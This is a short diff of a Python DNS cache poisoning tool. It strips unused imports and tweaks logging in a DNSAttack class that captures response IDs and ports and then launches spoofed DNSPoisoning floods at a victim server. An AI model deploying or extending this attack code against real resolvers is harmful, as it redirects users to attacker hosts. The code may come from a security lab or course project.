@@ -5,17 +5,9 @@
 #
 import dns.resolver
 from dns.resolver import NoAnswer
-import multiprocessing
-import random #For generating random ID
-import time
 import socket
-import sys
 import signal
-from blessings import Terminal #For terminal colors
 from multiprocessing.pool import ThreadPool, Pool
-import logging
-import threading
-from threading import Thread
 
 from enum import Enum
 
@@ -119,7 +111,7 @@ class DNSAttack:
 
         while True:
             data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-            self.log("Response source port :" + str(addr[1]), 2)
+            self.log("Response source port :{t.bold}{t.blue}" + str(addr[1]) + "{t.normal}", 2)
             received_id = data[0:2]
 
             initial_id = int.from_bytes(received_id, byteorder='big')
@@ -210,7 +202,7 @@ class DNSAttack:
 
 
             poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, '10.0.0.1', fetched_id, sport = source_port,\
-                victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, blessing_terminal=self.t, socket=flood_socket)
+                victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)
 
 
             self.log("Ok, let's try to perform \"{t.italic}Classical Shenanigans{t.normal}\" attack")
